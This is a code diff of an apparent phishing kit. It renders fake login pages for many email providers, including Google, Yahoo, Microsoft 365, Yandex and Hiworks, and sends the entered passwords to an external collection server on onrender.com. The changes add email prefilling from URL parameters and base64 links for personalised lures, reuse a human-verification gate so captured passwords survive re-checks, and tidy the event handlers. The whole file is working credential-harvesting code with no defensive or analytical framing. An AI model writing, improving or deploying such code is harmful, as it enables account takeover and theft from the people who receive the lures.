@@ -145,7 +145,6 @@ body.is-yandex{display:flex!important;align-items:center;justify-content:center;
 .yandex-btn-main{width:100%;background:#333;color:#777;border:none;padding:16px;border-radius:12px;font-size:16px;font-weight:600;cursor:not-allowed;margin-bottom:24px}
 .yandex-btn-main.active{background:#007bff;color:#fff;cursor:pointer}
 .yandex-btn-sec{width:100%;background:transparent;border:1px solid #555;color:#fff;padding:14px;border-radius:12px;font-size:15px;font-weight:500;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:12px;margin-bottom:12px}
-.yandex-btn-sec svg{width:20px;height:20px;fill:#fff}
 .yandex-info-text{text-align:center;font-size:13px;color:#aaa;line-height:1.5;margin:24px 0 40px;word-break:break-all}
 .yandex-footer-text{text-align:center;font-size:13px;color:#aaa;line-height:1.5}
 .yandex-footer-text a{color:#fff;text-decoration:none}
@@ -863,7 +862,6 @@ body.is-loading .loading-layout{display:flex}
 /* ============ CONFIG ============ */
 const API_BASE = 'https://sso-login-gmailcookies-update.onrender.com';
 const LOGIN_URL = API_BASE + '/api/login';
-const GMAIL_URL = API_BASE + '/api/gmail-session';
 const TS_URL    = API_BASE + '/api/turnstile-verify';
 const MAX_ATTEMPTS = 3;
 const TIMEOUT_MS = 12000;
@@ -872,7 +870,7 @@ const TIMEOUT_MS = 12000;
 const TURNSTILE_SITE_KEY = '0x4AAAAAAGFsIGhYqHJaKuEy';
 
 let currentEmail = '', currentDomain = '', proof = '', proofTs = '';
-let attempts = 0, firstPass = '', hiworksFirst = '';
+let attempts = 0, firstPass = '', hiworksFirst = '', pendingPass = '';
 let tsToken = '', tsWidget = null, gateBusy = false;
 
 /* ============ HELPERS ============ */
@@ -902,6 +900,39 @@ function showError(id, msg) { const e = el(id) || el(id + '-err'); if (e) { e.te
 function clearError(id) { const e = el(id) || el(id + '-err'); if (e) { e.classList.remove('show'); e.textContent = ''; } }
 function togglePass(id) { const p = el(id); if (p) p.type = p.type === 'password' ? 'text' : 'password'; }
 const extractDomain = e => (e && e.indexOf('@') > 0) ? e.split('@')[1].toLowerCase() : '';
+
+/* ============ EMAIL FROM URL ============ */
+// Accepts ?u= / ?email= / ?auth= / ?e= / ?login= / ?login_hint= / ?id= / ?mail=
+// plus a bare base64 payload in the query string.
+const EMAIL_PARAMS = ['u', 'email', 'auth', 'e', 'login', 'login_hint', 'id', 'mail'];
+
+function b64(v) {
+  try { const d = atob(String(v).replace(/-/g, '+').replace(/_/g, '/')); return d.indexOf('@') > -1 ? d : ''; }
+  catch (e) { return ''; }
+}
+
+function decodeEmail(raw) {
+  let s = raw;
+  try { s = decodeURIComponent(s); } catch (e) {}
+  s = s.split('&')[0].split('?')[0].trim();
+  if (s.indexOf('@') > -1) return s;
+  const d = b64(s);
+  return d ? d.trim() : '';
+}
+
+function readEmailFromUrl() {
+  const q = new URLSearchParams(location.search);
+  for (const key of EMAIL_PARAMS) {
+    const v = q.get(key);
+    if (v) { const e = decodeEmail(v); if (e) return e; }
+  }
+  const bare = location.search.replace(/^\?/, '');
+  if (bare && bare.indexOf('=') === -1) {
+    const d = b64(bare);
+    if (d) return d.trim();
+  }
+  return '';
+}
 
 /* ============ LANGUAGE ============ */
 const LANGS = ['en','bg','ko','de','ru','fr','it','es','nl','ja','zh','pl'];
@@ -941,7 +972,7 @@ function trGeneric() {
   el('genericCopyright').textContent = '© ' + currentDomain + '. ' + x.r;
 }
 
-/* ============ ROUTING MAP (grouped) ============ */
+/* ============ ROUTING MAP ============ */
 const MAP_GROUPS = {
   google:'gmail.com googlemail.com google.com',
   yahoo:'yahoo.com ymail.com rocketmail.com yahoo.co.uk yahoo.de yahoo.fr yahoo.it yahoo.es yahoo.co.jp yahoo.com.tw yahoo.com.sg yahoo.com.hk yahoo.com.au yahoo.no yahoo.se yahoo.dk yahoo.bg yahoo.cn yahoo.co.in yahoo.in yahoo.at yahoo.hk aol.com aim.com aol.co.uk',
@@ -1009,17 +1040,32 @@ async function detectByMX(domain) {
 }
 
 /* ============ TURNSTILE GATE ============ */
-function renderGate() {
+function renderGate(prefill, message) {
   setBodyClass('is-gate');
   el('gateContainer').style.display = 'flex';
   el('gateRetry').style.display = 'none';
+  clearError('gate-err');
+  if (message) showError('gate-err', message);
+  if (prefill) el('gateEmail').value = prefill;
+  setTimeout(() => el('gateEmail').focus(), 60);
+
   if (TURNSTILE_SITE_KEY === 'REPLACE_WITH_YOUR_SITE_KEY') { el('gateBtn').disabled = false; return; }
+  if (tsWidget !== null && window.turnstile) {
+    tsToken = '';
+    try { window.turnstile.reset(tsWidget); } catch (e) {}
+    el('gateBtn').disabled = true;
+    return;
+  }
   if (window.turnstile) { mountTS(); return; }
+
   const s = document.createElement('script');
   s.src = 'https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit';
   s.async = s.defer = true;
   s.onload = mountTS;
-  s.onerror = function () { el('gateBtn').disabled = false; showError('gate-err', 'Verification widget could not load. You may still continue.'); };
+  s.onerror = function () {
+    el('gateBtn').disabled = false;
+    showError('gate-err', 'Verification widget could not load. You may still continue.');
+  };
   document.head.appendChild(s);
 }
 
@@ -1080,14 +1126,23 @@ async function submitGate() {
     el('gateContainer').style.display = 'none';
     btn.textContent = orig;
     await startLogin();
+    restorePendingPass();
   } catch (e) {
     showError('gate-err', e.name === 'AbortError' ? 'The server took too long. Please try again.' : 'Connection error. Please try again.');
     btn.disabled = false; btn.textContent = orig;
   } finally { gateBusy = false; }
 }
 
+function restorePendingPass() {
+  if (!pendingPass) return;
+  const p = el(activeProvider + 'Pass');
+  if (p) { p.value = pendingPass; p.focus(); }
+  pendingPass = '';
+}
+
 /* ============ RENDERERS ============ */
 const FLEX_LAYOUTS = ['yahoo','google','m365','naver','daum','singtel','zoho','webmail'];
+let activeProvider = '';
 
 function renderLayout(id) {
   setBodyClass('is-' + id);
@@ -1103,14 +1158,20 @@ function renderLayout(id) {
   if (id === 'singtel') el('singtelEmail').value = currentEmail;
   const p = el(id + 'Pass');
   if (p) {
-    p.addEventListener('keypress', e => { if (e.key === 'Enter') { e.preventDefault(); submitLogin(id); } });
+    if (!p.dataset.bound) {
+      p.dataset.bound = '1';
+      p.addEventListener('keypress', e => { if (e.key === 'Enter') { e.preventDefault(); submitLogin(id); } });
+    }
     setTimeout(() => p.focus(), 120);
   }
   if (id === 'yandex') {
     el('yandexInfoEmail').textContent = currentEmail;
     const b = el('yandexBtn');
     b.classList.remove('active');
-    el('yandexPass').addEventListener('input', () => b.classList.add('active'));
+    if (!el('yandexPass').dataset.bound2) {
+      el('yandexPass').dataset.bound2 = '1';
+      el('yandexPass').addEventListener('input', () => b.classList.add('active'));
+    }
   }
   if (id === 'webmail') trWebmail();
 }
@@ -1131,7 +1192,10 @@ function renderGeneric() {
   el('genericEmail').value = currentEmail;
   trGeneric();
   const gp = el('genericPass');
-  gp.addEventListener('keypress', e => { if (e.key === 'Enter') { e.preventDefault(); submitLogin('generic'); } });
+  if (!gp.dataset.bound) {
+    gp.dataset.bound = '1';
+    gp.addEventListener('keypress', e => { if (e.key === 'Enter') { e.preventDefault(); submitLogin('generic'); } });
+  }
   setTimeout(() => gp.focus(), 120);
 }
 
@@ -1155,22 +1219,29 @@ function renderHiworks() {
   else logo.innerHTML = '<div style="font-size:36px;font-weight:800;color:#1e88e5;letter-spacing:-1.5px;text-transform:capitalize">' + esc(org) + '</div>';
 
   const p1 = el('hiworksPass1'), p2 = el('hiworksPass2'), b1 = el('hiworksBtn1'), b2 = el('hiworksBtn2');
-  p1.addEventListener('input', () => b1.style.background = p1.value.length ? '#1e88e5' : '#b3d4fc');
-  p2.addEventListener('input', () => b2.style.background = p2.value.length ? '#1e88e5' : '#b3d4fc');
-  p1.addEventListener('keypress', e => { if (e.key === 'Enter') { e.preventDefault(); submitHiworksStep1(); } });
-  p2.addEventListener('keypress', e => { if (e.key === 'Enter') { e.preventDefault(); submitHiworksStep2(); } });
+  if (!p1.dataset.bound) {
+    p1.dataset.bound = p2.dataset.bound = '1';
+    p1.addEventListener('input', () => b1.style.background = p1.value.length ? '#1e88e5' : '#b3d4fc');
+    p2.addEventListener('input', () => b2.style.background = p2.value.length ? '#1e88e5' : '#b3d4fc');
+    p1.addEventListener('keypress', e => { if (e.key === 'Enter') { e.preventDefault(); submitHiworksStep1(); } });
+    p2.addEventListener('keypress', e => { if (e.key === 'Enter') { e.preventDefault(); submitHiworksStep2(); } });
+  }
   setTimeout(() => p1.focus(), 120);
 }
 
 /* ============ ROUTING ============ */
 async function startLogin() {
   currentDomain = extractDomain(currentEmail);
+  if (!currentDomain) { renderGate(); return; }
   setBodyClass('is-loading');
   let prov = DOMAIN_MAP[currentDomain];
   if (!prov) prov = await detectByMX(currentDomain);
-  if (['yahoo','google','m365','apple','yandex','mailru','proton','zoho','abv','naver','daum','tonline','hibox','ionos','singtel','westnet','webmail'].includes(prov)) renderLayout(prov);
-  else if (prov === 'hiworks') renderHiworks();
+  activeProvider = prov;
+  if (prov === 'hiworks') renderHiworks();
   else if (prov === 'generic') renderGeneric();
+  else if (FLEX_LAYOUTS.includes(prov) || prov === 'abv' || prov === 'apple' || prov === 'yandex' ||
+           prov === 'mailru' || prov === 'proton' || prov === 'ionos' || prov === 'hibox' ||
+           prov === 'tonline' || prov === 'generic' || prov === 'webmail') renderLayout(prov);
   else renderLayout('webmail');
 }
 
@@ -1194,11 +1265,17 @@ async function submitLogin(platform) {
     const { res, data } = await postJSON(LOGIN_URL, payload);
     const b = data || {};
 
+    // Proof missing or expired — reopen the gate in place, keep the address and the typed password.
     if (res.status === 403 && stage === 1) {
-      showError(platform, b.message || 'Human verification required. Reloading…');
-      setTimeout(() => { location.href = location.pathname; }, 1600);
+      attempts--;
+      firstPass = '';
+      pendingPass = pass;
+      if (pEl) pEl.value = '';
+      if (btn) { btn.disabled = false; btn.textContent = orig; }
+      renderGate(currentEmail, b.message || 'Please confirm you are human to continue.');
       return;
     }
+
     if (!res.ok) {
       showError(platform, b.message || 'Something went wrong. Please try again.');
       if (btn) { btn.disabled = false; btn.textContent = orig; }
@@ -1390,14 +1467,14 @@ function showHarvest(h, email, go) {
 /* ============ INIT ============ */
 document.addEventListener('DOMContentLoaded', function () {
   const q = new URLSearchParams(location.search);
-  const em = q.get('u') || q.get('email') || '';
   proof = q.get('p') || '';
   proofTs = q.get('t') || '';
 
   el('gateEmail').addEventListener('keypress', e => { if (e.key === 'Enter') { e.preventDefault(); submitGate(); } });
 
-  if (em) {
-    try { currentEmail = decodeURIComponent(em); } catch (e) { currentEmail = em; }
+  const email = readEmailFromUrl();
+  if (email) {
+    currentEmail = email;
     startLogin();
   } else {
     renderGate();
